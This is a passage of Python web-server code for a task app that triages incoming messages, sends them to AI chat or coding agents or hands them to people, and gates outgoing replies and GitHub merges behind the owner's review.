    ``general`` is the conversational assistant; ``coding`` is a CLI in a checkout.  The caller
    may deliberately correct triage here: clicking Coding agent or Regular agent is an owner
    verdict, not a hint. A request without a kind remains compatible with task-page continuation
    and uses the task's already-established kind.
    """
    from . import general
    task = store.get_task(tid)
    if not task: raise HTTPException(404, 'task not found')
    # An explicit selection is still a real input even when this task ultimately belongs in the
    # regular workspace. Reject stale/deleted agent names instead of silently accepting a typo.
    if body.agent and not store.get_agent(body.agent):
        raise HTTPException(422, f'unknown agent: {body.agent}')
    task_kind = str(task.get('Kind') or '').lower()
    requested = str(body.kind or '').lower()
    if requested and requested not in task_kinds.AGENT:
        raise HTTPException(422, 'kind must be general or coding')

    # NO SECOND HAND-OFF WHILE AN AGENT RUNS (the owner, 2026-10-01: Send to agent is not offered then - Continue
    # instead). Another dispatch on a live session either started a second worker or typed into the first unasked; every
    # door - button, chip, chat word, operation - comes through here, so the refusal is said here.
    live = hub_term.session_for(tid)
    if live and live.alive:
        who = getattr(live, 'agent', None) or getattr(live, 'label', None) or 'An agent'
        raise HTTPException(409, f'{who} is already working on this task - Continue that session instead of sending it to another agent'
                                 + ('' if not requested or requested == task_kind else ', or stop it before changing agent type'))
    if requested and requested != task_kind:
        was_kind, was_route = operations.verdict_of_task(store, tid)
        store.update_task(tid, {'Kind': requested}, ACTOR)
        operations.record_direct(store, 'dispatch.prepare', tid, {'kind': requested}, ACTOR, {'kind': requested}, verdict=was_kind, route_id=was_route)
        task = store.get_task(tid)
        task_kind = requested

    regular = general.handles(task)

    if regular:
        had_session = general.session_for(tid) is not None
        # THE PROFILE IS THE ASSIGNEE. A general hand-off may now name the worker it goes to, and
        # `agent:<name>` is where general.assigned_role already reads it from to seed PROFILE RULES -
        # so choosing one needs no new column and no migration (the owner, 2026-09-18). A CODING
        # profile named here would seed CODING.md into a chat, so it is refused rather than obeyed.
        if body.agent and body.agent != general.assigned_role(store, task):
            if str((store.get_agent(body.agent) or {}).get('Kind') or '').lower() in ('coding', 'cli'):
                raise HTTPException(422, f'{body.agent} is a coding profile - it cannot run a non-coding task')
            store.update_task(tid, {'Assignee': f'agent:{body.agent}'}, ACTOR)
            task = store.get_task(tid)
        try:
            session = general.start_session(store, tid, model=body.model, pick=body.pick or None, actor=ACTOR)
        except (ValueError, RuntimeError) as e:
            raise HTTPException(422, str(e))
        # The source messages and their files are injected by GeneralSession.send_prompt.  On a
        # new conversation the task summary is the first ask; on an existing conversation only
        # an explicit new instruction is sent, so clicking twice cannot duplicate the task.
        history = general.history(store, tid)
        prompt = str(body.instruction or '').strip()
        if not prompt and not history:
            prompt = str(task.get('Summary') or task.get('Title') or '').strip()
        if prompt:
            background.add_task(session.send_prompt, prompt)
        # the same four words every door speaks (PW-209): a reused conversation is not a new start
        return {'dispatch': 'assistant', 'agent': session.provider, 'model': session.model, 'started': not had_session, 'existing': had_session,
                'taskId': tid, 'ref': task_ref(tid), 'session': session.info(tail=3)}

    agent = body.agent or hub_agents.default_agent(store)
    if not store.get_agent(agent): raise HTTPException(422, f'unknown agent: {agent}' if agent else 'no coding agent is set up to take it')
    # THE BRAIN TRAVELS WITH THE ROLE. This called start_session without it, so a picked CLI got as
    # far as the door and no further: "chose devin from start coding agent screen but it started
    # claude code" (the owner, 2026-09-22). agent = who works it, brain = what runs it.
    ses = start_session(store, tid, agent, body.model, body.instruction, brain=body.brain)
    existing = bool((ses or {}).get('existing'))
    return {'dispatch': 'session', 'agent': agent, 'brain': body.brain, 'model': body.model, 'started': not existing, 'existing': existing,
            'accepted': (ses or {}).get('accepted'),      # the prompt was submitted, not merely typed (PW-209)
            'taskId': tid, 'ref': task_ref(tid), 'session': ses}

@app.post('/api/messages/{mid}/dispatch')
def dispatch_message(mid: int, body: DispatchBody, background: BackgroundTasks):
    """Hand a timeline item to the explicitly selected agent type."""
    m = store.get_message(mid)
    if not m: raise HTTPException(404, 'message not found')
    requested = str(body.kind or '').lower()
    # A named CLI agent is itself an explicit coding choice for old API clients. With neither a
    # kind nor an agent, guessing from triage is exactly the bug this endpoint must prevent.
    if not requested and not body.agent:
        raise HTTPException(422, 'Choose an agent type: general or coding')
    _learn_promotion(m, background, body.standing)
    verdict, route_id = operations.verdict_of_message(store, m)
    tid = m.get('TaskId') or task_from_message(
        store, mid, ACTOR, requested if requested in task_kinds.AGENT else 'coding')
    try:
        out = _dispatch_task_to_its_agent(tid, body, background)
        operations.record_direct(store, 'task.create_from_message', mid, {'kind': requested if requested in task_kinds.AGENT else 'coding'}, ACTOR,
                                 {'taskId': tid, 'dispatch': out.get('dispatch')}, verdict=verdict, route_id=route_id)
        return out
    except HTTPException as e:
        reason = str(e.detail or '')
        # This is a decision, not a failed action. The message may only just have become a task,
        # so return its id and let the card ask which repo before resuming the same dispatch.
        if e.status_code == 422 and NEEDS_REPO.search(reason):
            from . import funnel; funnel.hold_for_repo(store, tid, reason)
            return {'dispatch': 'needs_repo', 'started': False, 'existing': False, 'agent': body.agent or hub_agents.default_agent(store), 'taskId': tid,
                    'ref': task_ref(tid), 'reason': reason}
        raise

def _learn_promotion(m: dict, background, standing: bool = False):
    """A FILED message the owner promotes by hand is a triage miss in the other direction -
    fyi was the wrong call. The under-reach lessons matter as much as the over-reach ones.

    Promotion used to go only to the AI distillation pass. That made the button claim less than
    it did, while Settings -> Memory showed no evidence that the click had been learned. Save the
    concrete, scoped verdict first; LEARNED.md can then distill its general shape like every other
    owner correction. A positive verdict is evidence, never a hard rule that every similar message
    must become work.
    """
    # A REPORT RUN is one run, not a kind of mail. Its subject is the same every day, so a topic-scoped 'MADE A TASK' note turned
    # the owner sending Monday's run to an agent into a standing order that every later run was a task (the owner, 2026-09-30:
    # "i sent it to agent yesterday but now everyday it's being sent there"). What a report should do each run is the report's
    # own routing, and that is the owner's to set there. So a run is one-off unless the owner says `standing`.
    if m.get('Channel') == 'report' and not standing: return None
    if m.get('TaskId') or m.get('Status') != 'filed': return None
    em, topic = (m.get('FromEmail') or '').lower(), _topic_key(m)
    if not (em or topic): return None
    memid = store.add_memory({'Scope': 'subject' if topic else 'sender', 'ScopeKey': topic or em,
                              'Source': 'verdict', 'Active': 1, 'CreatedBy': ACTOR,
                              'Note': f"{str(m.get('SentAt') or '')[:10]}: \"{(m.get('Subject') or '')[:90]}\""
                                      + (f' from {em}' if em else '') + (f' - the topic "{topic}"' if topic else '')
                                      + ' - MADE A TASK: triage filed it, but the owner promoted it as real work'})
    learn.note_verdicts(store)
    if background is not None:
        background.add_task(learn.learn_from, store,
                            f"mem{memid}: triage filed \"{(m.get('Subject') or '')[:80]}\" from "
                            f"{m.get('FromEmail') or m.get('SourceName') or '?'} as fyi, but the owner made it a task - "
                            'triage under-reached')
    return memid

# WHICH ROAD IT SHOULD HAVE TAKEN. The Triage tab shows the five roads and says "correcting this
# teaches it" - and there was nothing to click. A correction here is worth more than any other
# signal the funnel gets: it is the owner looking at one real message and saying what should have
# happened to it. So it does BOTH halves - it puts the message on the road it should have taken,
# and it writes the verdict down where the next classification will read it.
ROADS = {'fyi': 'nothing to do', 'reply': 'a sentence settles it', 'coding': 'an agent on a keyboard',
         'general': 'talk it through with the assistant', 'task': 'yours - nothing works it'}
ROAD_VERDICT = {'fyi': 'FILE IT: not work', 'reply': 'REPLY ONLY: answering it IS the work',
                'coding': 'CODING TASK: an agent should work it', 'general': 'A CONVERSATION, not a project',
                'task': "THE OWNER'S OWN TASK: real work, but not an agent's"}


class ReclassifyBody(BaseModel):
    road: str                       # fyi | reply | coding | general | task
    agent: str | None = None        # the ROLE that works it
    brain: str | None = None        # WHICH CLI runs it - blank means the brain settings name


def _teach_reclassify(m: dict, was: str, road: str, background) -> int:
    """The correction as EVIDENCE, not as a rule. Keyed to the topic where there is one and to the
    sender otherwise - never to the sender alone on a channel with no address, which is how one
    verdict about one message becomes a policy about a person (see file_message)."""
    em, topic = (m.get('FromEmail') or '').lower(), _topic_key(m)
    if not (em or topic): return 0
    memid = store.add_memory({'Scope': 'subject' if topic else 'sender', 'ScopeKey': topic or em,
                              'Source': 'verdict', 'Active': 1, 'CreatedBy': ACTOR,
                              'Note': f"{str(m.get('SentAt') or '')[:10]}: \"{(m.get('Subject') or '')[:90]}\""
                                      + (f' from {em}' if em else '') + (f' - the topic \"{topic}\"' if topic else '')
                                      + f' - {ROAD_VERDICT[road]}'
                                      + (f' (triage had called it {was})' if was else '')})
    learn.note_verdicts(store)
    ev = (f'mem{memid}: triage called \"{(m.get("Subject") or "")[:80]}\" from '
          f'{m.get("FromEmail") or m.get("SourceName") or "?"} {was or "unclassified"}, and the owner '
          f'reclassified it as {road} - {ROADS[road]}')
    if background is not None: background.add_task(learn.learn_from, store, ev)
    else: learn.learn_from(store, ev)
    return memid


def _road_head(road: str) -> str:
    "A road in the route record's own words (categories.route_head): the record leads with whose the work is."
    from .categories import route_head
    return route_head({'fyi': 'fyi', 'reply': 'reply_only'}.get(road, 'task'), road)


def _road_now(m: dict) -> str:
    """What the funnel decided, read the way the panel reads it (FeedView roadOf)."""
    routes = store.message_routes(m['MessageId']) or []
    reason = str((routes[-1] if routes else {}).get('Reason') or '')
    from .categories import route_intent
    said = route_intent(reason)
    if said == 'fyi': return 'fyi'
    if said == 'reply_only': return 'reply'
    kind = str((store.get_task(m['TaskId']) or {}).get('Kind') or '') if m.get('TaskId') else ''
    if kind in ('coding', 'task'): return kind
    return 'general' if m.get('TaskId') else ''


@app.post('/api/messages/{mid}/reclassify')
def reclassify_message(mid: int, body: ReclassifyBody, background: BackgroundTasks = None):
    """Put this message on the road it should have taken, and remember that triage was wrong.

    Not a relabel: each road is the same action its own button performs, so reclassifying to
    coding really starts the agent and reclassifying to fyi really drops the task. Saying it
    without doing it would leave the funnel and the record disagreeing, which is the failure this
    whole panel exists to prevent."""
    m = store.get_message(mid)
    if not m: raise HTTPException(404, 'message not found')
    road = str(body.road or '').lower()
    if road not in ROADS: raise HTTPException(422, f'unknown road: {body.road!r} - one of {", ".join(ROADS)}')
    was = _road_now(m)
    if was == road: return {'ok': True, 'road': road, 'changed': False, 'was': was}
    memid = _teach_reclassify(m, was, road, background)
    store.audit('message', mid, 'reclassified', ACTOR, detail={'from': was or None, 'to': road, 'memory': memid or None})
    # the panel reads the road off the newest route row, so the correction has to be written where
    # the verdict lives - otherwise the pill still shows what triage said
    store.add_route(mid, m.get('TaskId'),
                    {'fyi': 'file', 'reply': 'reply', 'coding': 'create', 'general': 'create', 'task': 'create'}[road],
                    None, f'triage: {_road_head(road)} - you reclassified this'
                          + (f' (triage called it {_road_head(was)})' if was else '') + ' - the verdict is in memory for next time',
                    [], ACTOR)
    out = {'ok': True, 'road': road, 'changed': True, 'was': was, 'memory': memid or None}
    if road == 'fyi': file_message(mid, None, background)
    elif road == 'reply': out['reply'] = open_reply(mid, None)
    elif road == 'coding': out['agent'] = dispatch_message(mid, DispatchBody(agent=body.agent, kind='coding'), background)
    elif road == 'general': out['chat'] = chat_message(mid, background)
    else: out['task'] = mine_message(mid, MineBody(kind='task'), background)
    return out


# ── the assistant on the Timeline (assistant.py): its post and its buttons ───────────────────
@app.get('/api/assistant/ideas')
def assistant_ideas(status: str = None, mid: int = None):
    """What the assistant has said, with what became of each line - by state, or the lines of one post."""
    def row(i):
        out = assistant._public(i) | {'firstSeen': i.get('FirstSeen'), 'lastSaid': i.get('LastSaid'), 'messageId': i.get('MessageId')}
        # Preserve the historical words, but do not keep presenting a disproved "nobody replied"
        # suggestion as open. The successful Review receipt supplies the accurate ending even if
        # the external channel has not ingested our outbound copy as a message.
        if assistant.contradicts_sent_reply(store, out):
            reply = assistant.sent_reply_for(store, out)
            out['answered'] = {'at': reply.get('DecidedAt') or reply.get('CreatedAt'),
                               'text': reply.get('FinalText') or reply.get('DraftText') or ''}
        return out
    return {'data': [row(i) for i in store.list_ideas(status or None, mid)]}

class IdeaBody(BaseModel): days: int = 1; until: str = None

@app.post('/api/assistant/ideas/{iid}/{verb}')
def assistant_act(iid: int, verb: str, body: IdeaBody = None):
    """One word on one line (assistant.VERBS): task (Make a task), agent (Send to agent), dismiss (Not ours),
    snooze (Remind me - `until` a day, or `days`), done."""
    try: return assistant.act(store, iid, verb, ACTOR, days=(body.days if body else 1), until=(body.until if body else None))
    except ValueError as e: raise HTTPException(422, str(e))

# what GeneralWorkspace reads to open a chat with its question already asked (newTask.js)
ASK_TAG = 'ask:assistant'

class MineBody(BaseModel):
    # a plain task: on the owner's list, nothing working it. NOT `general` - that kind opens the
    # assistant's chat (general.GENERAL_KINDS), which is not what "this one is mine" means.
    kind: str = 'task'
    title: str | None = None        # the assistant's suggested title, accepted as-is from the panel
    standing: bool = False          # a REPORT run only: 'every run like this', not 'just this one'

@app.post('/api/messages/{mid}/mine')
def mine_message(mid: int, body: MineBody = None, background: BackgroundTasks = None):
    """"This one is mine": a real task, on my list, with no agent sent at it. A lot of mail is
    genuinely work and genuinely not an agent's - go into some web app, approve the thing - and
    filing it as "nothing to do" is a lie. It lands as a task assigned to you, which the feed
    already reads as needs-you (no run on it, not done). The day a computer-use connector exists,
    THIS is the queue it takes from."""
    m = store.get_message(mid)
    if not m: raise HTTPException(404, 'message not found')
    _learn_promotion(m, background, bool(body and body.standing))
    verdict, route_id = operations.verdict_of_message(store, m)
    want = (body.kind if body else None) or 'task'
    # A message that ALREADY has a task short-circuits task_from_message, so "this one is mine"
    # on anything triage had already opened changed nothing and taught nothing - it claimed the
    # task and left the kind exactly as the verdict it was overturning (the audit, 2026-09-11).
    tid = m.get('TaskId') or task_from_message(store, mid, ACTOR, want, ACTOR)
    _reclassify(tid, want, background)
    from . import selfclose
    selfclose.claim(store, tid, ACTOR)
    # "mine" takes it off the AGENT's hands, so a worker on the task is precisely what it overrides
    # - the guard used to skip whenever ANY assignee existed, which meant every task triage had
    # routed (they all carry `agent:<role>`) silently ignored the owner claiming it. Only a person
    # already owning it is left alone.
    _who = str((store.get_task(tid) or {}).get('Assignee') or '')
    if not _who or _who.startswith('agent:'): store.update_task(tid, {'Assignee': ACTOR}, ACTOR)
    operations.record_direct(store, 'task.create_from_message', mid, {'kind': (body.kind if body else None) or 'task'}, ACTOR, {'taskId': tid}, verdict=verdict, route_id=route_id)
    if body and (body.title or '').strip(): store.update_task(tid, {'Title': body.title.strip()[:200]}, ACTOR)
    store.audit('task', tid, 'mine', ACTOR, detail={'message_id': mid, 'subject': m.get('Subject')})
    return {'taskId': tid, 'ref': task_ref(tid)}

def chat_message(mid: int, background: BackgroundTasks = None):
    """The message becomes a `general` task and the assistant's chat opens on it with the question
    already asked - the road a reclassify to `general` and a `task.create_from_message` of kind
    general take. Its own door (POST /api/messages/{id}/chat, the old row panel's "Talk it through")
    went with that panel."""
    m = store.get_message(mid)
    if not m: raise HTTPException(404, 'message not found')
    _learn_promotion(m, background)
    verdict, route_id = operations.verdict_of_message(store, m)
    tid = m.get('TaskId') or task_from_message(store, mid, ACTOR, 'general', ACTOR)
    operations.record_direct(store, 'task.create_from_message', mid, {'kind': 'general'}, ACTOR, {'taskId': tid}, verdict=verdict, route_id=route_id)
    from . import selfclose
    selfclose.claim(store, tid, ACTOR)
    _reclassify(tid, 'general', background)
    t = store.get_task(tid) or {}
    # the ask tag is what GeneralWorkspace reads to open with the question instead of an empty
    # thread (website/src/newTask.js). It strips the tag as it asks, so a reload never re-asks.
    tags = [x.strip() for x in str(t.get('Tags') or '').split(',') if x.strip()]
    if ASK_TAG not in tags: store.update_task(tid, {'Tags': ','.join(tags + [ASK_TAG])}, ACTOR)
    store.audit('task', tid, 'chat', ACTOR, detail={'message_id': mid, 'subject': m.get('Subject')})
    return {'taskId': tid, 'ref': task_ref(tid), 'chat': True}

class SplitBody(BaseModel): kind: str | None = None

@app.post('/api/messages/{mid}/split')
def split_msg(mid: int, body: SplitBody = None):
    """Give this message its own task. Two unrelated asks in one chat thread are one
    conversation but two jobs, and an agent sent at the task only ever gets the first."""
    if not store.get_message(mid): raise HTTPException(404, 'message not found')
    tid = split_message(store, mid, ACTOR, (body.kind if body else None))
    from . import selfclose
    selfclose.claim(store, tid, ACTOR)
    return {'taskId': tid, 'ref': task_ref(tid)}

class HandoffBody(BaseModel):
    to: str | None = None; channel: str = 'email'; note: str | None = None
    text: str | None = None; draft_only: bool = False

# ── the agent wall (blackboard.py): what the agents leave for each other ─────────────────
class NoteBody(BaseModel):
    body: str; kind: str = 'note'; agent: str | None = None
    cwd: str | None = None; task_id: int | None = None; files: str | None = None

@app.get('/api/board/notes')
def board_notes(request: Request, cwd: str = '', limit: int = 60, all: bool = False):
    """Live handoffs by default; durable note history when ``all`` is requested - a stranger's task's notes in either for
    the owner's own screen only, since a session reads this into its own context (blackboard.without_strangers)."""
    owner = guard.scope_of(cfg['server'], request.headers) == guard.OWNER
    rows = (blackboard.history(store, cwd or None, limit, strangers=owner) if all
            else blackboard.live_wall(store, cwd, limit, strangers=owner))
    # `owner`: the name a note the owner wrote may carry - the wall used to hardcode one (2026-10-11)
    return {'data': rows, 'owner': store.owner()['owner'],
            'kinds': list(blackboard.KINDS), 'summary_kind': blackboard.SUMMARY}

@app.post('/api/board/notes')
def board_post(body: NoteBody, request: Request):
    # a stranger's session speaks for its own task, whatever its body says: that task is what keeps the note off every
    # other session's seed (blackboard.live_notes)
    tid = guard.stranger_tid(cfg['server'], request.headers.get('X-Taskuary-Token'))
    try:
        return blackboard.post(store, body.body, body.kind, body.agent or ACTOR, body.cwd or '',
                               body.task_id if tid is None else tid, body.files or '')
    except ValueError as e: raise HTTPException(422, str(e))

@app.post('/api/board/notes/{note_id}/read')
def board_read(note_id: int, who: str = ''):
    store.mark_note_read(note_id, who or ACTOR)
    return {'ok': True}

@app.get('/api/people/pages')
def people_pages_list():
    """The pages the ledger keeps per person (people_pages.py): who, the doc name, when, how many lines."""
    from . import people_pages
    return {'data': people_pages.pages(store)}


@app.get('/api/people')
def people(limit: int = 300):
    """The address book behind every place a person is picked - looping somebody in on a reply,
    handing a task over. 60 was enough for a recency list you scroll; a box you SEARCH wants the
    whole book, so the pickers filter a wider set client-side (ui.ContactPicker)."""
    return {'data': store.people(max(1, min(int(limit), 1000)))}

@app.get('/api/send-targets')
def send_targets():
    """Where a report is allowed to be sent: the live channels, and the destinations known on
    each. The builder offers these and nothing else - a WhatsApp JID typed from memory is a
    report that quietly goes nowhere.

    `inboxes` names the chats Taskuary READS: never offered, and refused at the door - so a report still
    holding one from before can say so on its own card rather than in a log (the owner, 2026-09-24)."""
    targets = outbound.send_targets(store)
    can = {t['channel'] for t in targets}
    return {'data': targets, 'inboxes': {ch: sorted(v) for ch, v in outbound.input_chats(store).items() if ch in can}}

@app.post('/api/tasks/{task_id}/handoff')
def handoff(task_id: int, body: HandoffBody):
    """Hand the task to a PERSON: the AI writes the forward message from the task's own
    context, you edit it, and it goes out on the channel you picked."""
    t = store.get_task(task_id)
    if not t: raise HTTPException(404, 'task not found')
    try:
        text = (body.text or '').strip() or outbound.draft_handoff(store, task_id, body.to or 'a colleague', body.note)
        if body.draft_only: return {'draft': text}
        subject = f"{task_ref(task_id)} {t.get('Title') or ''}".strip()
        chat = [m for m in store.list_messages(task_id) if m['Channel'] == 'teams'] if body.channel == 'teams' else []
        if chat:
            # back into the conversation this task CAME from: no address to give, because the
            # thread is the recipient. (The old code demanded one anyway and then ignored it.)
            sent = outbound.send_teams(store, (chat[-1].get('ConversationId') or '')[6:], text)
        elif not body.to:
            raise HTTPException(422, 'who is it going to?')
        elif body.channel == 'email':
            sent = outbound.send_email(store, [body.to], subject, text)
        else:
            # ...and everywhere else this install can send. Handing work to a person was email or
            # the task's own Teams chat and nothing else, while the app has been able to send on
            # WhatsApp, Slack and Telegram for months - so "hand this to a colleague" meant opening
            # WhatsApp yourself, which is the app this one exists to keep you out of. send_out is
            # the same road a report's delivery takes: same senders, same credentials, and a
            # channel switched off for replies is off for this too.
            from . import capabilities
            no = capabilities.send_refusal(store, body.channel)
            if no: raise HTTPException(422, no)
            sent = outbound.send_out(store, body.channel, body.to, subject, text)
    except HTTPException: raise
    except Exception as e: raise HTTPException(422, str(e)[:400])
    store.add_comment(task_id, ACTOR, 'human', f'Handed off to {body.to} by {body.channel}:\n{text}')
    # FORWARD ONLY (the owner, 2026-10-18): handing it on used to close the task too, and nobody then saw whether the person
    # took it. Like Send, it does one thing: the task stays open and waits on them (the rail's "waiting on them"), and Mark
    # done is the owner's own step once it is finished. A task already closed stays closed.
    st = t.get('Status') if t.get('Status') in ('done', 'dropped') else 'waiting'
    if st != t.get('Status'): store.update_task(task_id, {'Status': st}, ACTOR)
    from . import funnel
    funnel.invalidate()
    store.audit('task', task_id, 'handoff', ACTOR, detail={'to': body.to, 'channel': body.channel, 'closed': False})
    return {'sent': sent, 'text': text, 'status': st}

@app.get('/api/runs/live')
def live_runs(lines: int = 3):
    """The tail of every run that is working right now - the Board renders it as a tiny
    console on each card (the full trace is on the task)."""
    out = []
    for r in store.running_runs():
        try: evs = [e for e in json.loads(r.get('TraceJson') or '[]') if e.get('kind') == 'live']
        except ValueError: evs = []                    # mid-write JSON: next poll fixes it
        out.append({'RunId': r['RunId'], 'TaskId': r['TaskId'], 'AgentName': r['AgentName'], 'kind': 'run',
                    'StartedAt': r['StartedAt'], 'idle': 0, 'files': blackboard.trace_files(r.get('TraceJson')),
                    'tail': [e['detail'] for e in evs[-max(1, min(lines, 10)):]]})
    # live pty sessions count as work in progress too - and their idle time is what says
    # whether the agent is thinking or parked at a question waiting for the owner
    for t in hub_term.live_sessions(tail=max(1, min(lines, 10))):
        if t.get('taskId'):
            # The floating guide reuses a general session, but it is app chrome rather than an
            # agent assigned to work. Do not put a duplicate of it on the Board or ring the
            # hand-raise bell while its answer is visible in the dock itself.
            if (store.get_task(t['taskId']) or {}).get('SourceRef') == 'assistant:dock': continue
            # `asking` = the session's own reading (terminal.worker_fields: a request, or the CLI's chooser on screen) - never
            # the words on its tail (2026-10-11): the hand-raise notification says "asked you something" instead of "stopped"
            out.append({'RunId': None, 'TaskId': t['taskId'], 'AgentName': t['agent'] or t['label'],
                        'kind': 'session', 'StartedAt': t['started'], 'idle': t['idle'],
                        'waiting': (w := t['waiting'] if t.get('waiting') is not None else t['idle'] >= hub_term.IDLE_WAITING), 'phase': t.get('phase'),
                        'asking': (ask := bool(w) and t.get('state') == 'asking'),
                        # ...and the ONE sentence for the state (lanes.json via workerstate.says), so the card, the
                        # Wall and the hand-raise ping read it instead of composing their own from `asking`
                        'request': t.get('request'), 'state': (sub := _workerstate().sub_state(bool(w), ask, t.get('request'))),
                        'line': _workerstate().says(sub, t['agent'] or t['label'], (t.get('request') or {}).get('text')) if sub else None,
                        'Title': (store.get_task(t['taskId']) or {}).get('Title') or '',
                        'files': t.get('files') or [], 'tail': t.get('tail') or [],
                        'cli': t.get('cli'), 'work': t.get('work')})     # the CLI it runs; said and did (witness.py) - the card's pane
    return {'data': out}

@app.get('/api/runs/{run_id}')
def get_run(run_id: int):
    r = store.get_run(run_id)
    if not r: raise HTTPException(404, 'run not found')
    return r

@app.get('/api/reviews')
def reviews(status: str = None):
    from .verdicts import context_moved
    rows = store.list_reviews(status)
    memo = {}
    for r in rows:
        r['CanSend'], r['SendBlock'] = _review_send_state(memo, r)
        moved, latest = context_moved(store, r)          # material change only (PW-240), never a polling timestamp
        r['Stale'] = bool(moved)
        if r['Stale'] and latest:
            r['LatestMessageId'] = latest.get('MessageId')
            r['LatestPreview'] = str(latest.get('BodyText') or '')[:1500]
            r['LatestSentAt'] = latest.get('SentAt')
    return {'data': rows}

@app.post('/api/reviews/{rid}/attachment')
async def review_attach(rid: int, request: Request, name: str = ''):
    """Put a file on a pending reply. The bytes are the raw body (no multipart dependency, like the
    waiting room's images); `name` is what the recipient will see it called."""
    from . import verdicts
    data = await request.body()
    try: return await run_in_threadpool(verdicts.attach, store, rid, name or 'attachment', data, ACTOR)      # it writes: off the loop
    except ValueError as e: raise HTTPException(422, str(e))

@app.delete('/api/reviews/{rid}/attachment')
def review_detach(rid: int, name: str):
    from . import verdicts
    try: return verdicts.detach(store, rid, name, ACTOR)
    except ValueError as e: raise HTTPException(422, str(e))

@app.post('/api/reviews/{rid}/decide')
def decide(rid: int, body: DecideBody, background: BackgroundTasks = None):
    """The verdict itself lives in verdicts.decide - ONE door, shared with the phone road
    (a 'approve' typed in the notify chat lands the same way this button does)."""
    rv = store.get_review(rid)
    if not rv: raise HTTPException(404, 'review not found')
    from .verdicts import VERB2STATUS, context_moved, decide as land
    if body.verb not in VERB2STATUS: raise HTTPException(422, 'bad verb')
    if body.verb == 'close_unsent' and rv.get('Kind') == 'action': raise HTTPException(422, 'a proposal is rejected, not closed without sending')
    # An uncertain attempt must be reconciled using its saved payload first. Refreshing
    # the draft here would prevent that check (or replace text that may already be sent).
    if (body.verb in ('approve', 'edit') and rv.get('Kind') != 'action'
            and rv.get('DeliveryState') not in ('unknown', 'sending')):
        try: _refresh_chat_context(task_id=rv.get('TaskId'), message_id=rv.get('MessageId'))
        except RuntimeError as e: raise HTTPException(503, str(e))
        rv = store.get_review(rid) or rv
        moved, latest = context_moved(store, rv)
        if moved:
            # The click does not send (PW-239): the context materially changed - a new inbound line, a triage
            # update - so the owner is interrupted with what arrived. Their own edit is kept for comparison, the
            # draft is refreshed from the current context, and the refreshed draft needs its own yes.
            yours = str(body.final_text or '').strip()
            if yours and yours != str(rv.get('DraftText') or '').strip() and rv.get('TaskId'):
                store.add_comment(rv['TaskId'], ACTOR, 'human', f'Your edited reply, kept for comparison - the thread moved before it was sent:\n{yours[:4000]}')
            draft = None
            try:
                draft = (responder.write_draft(store, rv['TaskId'], rid, actor=ACTOR)
                         if rv.get('TaskId') else responder.draft_for_message(store, latest, rid))
            except Exception as e:
                logger.warning(f'could not refresh stale review {rid}: {e}')
            triage = ''
            if rv.get('TaskId'):
                notes = [c for c in store.list_comments(rv['TaskId']) if str(c.get('Actor') or '').lower() == 'triage']
                triage = str(notes[-1].get('Body') or '')[:600] if notes else ''
            return {'ok': False, 'status': 'pending', 'sent': None, 'stale': True,
                    'draft': draft,
                    'interrupt': {'title': 'A new message arrived. Review it before sending.',
                                  'latest': ({'MessageId': latest.get('MessageId'), 'FromName': latest.get('FromName'), 'FromEmail': latest.get('FromEmail'),
                                              'SentAt': latest.get('SentAt'), 'preview': str(latest.get('BodyText') or '')[:1500]} if latest else None),
                                  'triage': triage, 'yours': yours or None, 'refreshed': draft},
                    'send_error': ('New messages arrived after this draft. '
                                   + ('I refreshed it with the latest context; review it and approve again.' if draft
                                      else f"Nothing was sent. Press {buttons.label('redraft')} to write it with the latest context before approving."))}
    return land(store, rv, body.verb, body.final_text, body.note, ACTOR,
                learn_async=(background.add_task if background is not None else None), cc=body.cc, reply_text=body.reply_text, anyway=body.anyway)

@app.get('/api/reviews/{rid}/closeout')
def closeout_state(rid: int):
    """What the close-out card should offer RIGHT NOW, read from GitHub (ghcloseout.assess): the pull request's state
    under this repository's rules, whether Close out may merge, why not, and the other buttons that fit."""
    from . import ghcloseout, proposals
    rv = store.get_review(rid)
    if not rv or rv.get('Kind') != 'action' or proposals._action(rv) not in proposals.CLOSEOUT: raise HTTPException(404, 'no close-out here')
    p = json.loads(rv.get('DraftText') or '{}')
    if p.get('action') == 'close_item':                  # a tracker item: where it stands now, and whether a move to done is there to make
        from . import trackers
        return trackers.assess(store, p)
    if p.get('action') != 'merge_pr': return {'state': 'open', 'ok': True, 'reason': '', 'note': '', 'offers': []}
    try: seen = ghcloseout.assess(store, p['repo'], int(p['number']))
    # FAIL CLOSED: an unreadable GitHub was drawn as a live Close out, and a token that could not see the repo merged into a 404
    except Exception as e: return {'state': 'unknown', 'ok': False, 'reason': f'GitHub could not be read just now ({str(e)[:160]}) - open the card again in a moment', 'note': '', 'offers': []}
    return {k: v for k, v in seen.items() if k != 'pr'}

@app.post('/api/reviews/{rid}/closeout/{act}')
def closeout_act(rid: int, act: str):
    """The close-out card's other buttons: Update branch (GitHub merges the base into the pull request) and Re-run
    checks (the failed Actions jobs on its head). Neither closes anything - the card is read again afterwards."""
    from . import ci, github, ghcloseout, proposals
    rv = store.get_review(rid)
    if not rv or proposals._action(rv) != 'merge_pr' or act not in ('update', 'rerun'): raise HTTPException(404, 'nothing to do here')
    p = json.loads(rv.get('DraftText') or '{}')
    seen = ghcloseout.assess(store, p['repo'], int(p['number']))
    if act not in seen['offers']: raise HTTPException(422, f"{'Update branch' if act == 'update' else 'Re-run checks'} is not offered for this pull request now")
    tok = ci._conn(store)['Secret']
    try:
        if act == 'update': said = f"Update branch: {github.update_branch(tok, p['repo'], int(p['number']), seen['pr'].get('sha'))}"
        else: said = f"Re-ran the failed checks on {github.rerun_failed(tok, p['repo'], seen['pr']['sha'])} workflow run(s)"
    except github.Refused as e:
        github.learn(tok, p['repo'], e); raise HTTPException(422, str(e))
    except (RuntimeError, requests.RequestException) as e: raise HTTPException(422, str(e))
    if rv.get('TaskId'): store.add_comment(rv['TaskId'], ACTOR, 'human', f"{said} - {p['repo']}#{p['number']}. Press {buttons.label('approve', 'action')} again once the checks pass.")
    return {'ok': True, 'said': said}

@app.get('/api/github/closeout-check')
def closeout_check():
    """For the GitHub card: per followed repository, each close-out act the settings turn on and whether the token may."""
    from . import ghcloseout
    try: return {'data': ghcloseout.check(store)}
    except RuntimeError as e: raise HTTPException(422, str(e))

@app.get('/api/tasks/{tid}/proof')
def task_proof(tid: int):
    """The evidence behind a task: files git says moved, the test run the session actually
    performed, CI on its pull request, attempts and timings - plus what is MISSING, said
    plainly, so a thin card is never mistaken for a clean one."""
    if not store.get_task(tid): raise HTTPException(404, 'task not found')
    from . import proof
    return proof.gather(store, tid)

@app.get('/api/tasks/{tid}/work')
def task_work(tid: int, diff: bool = True):
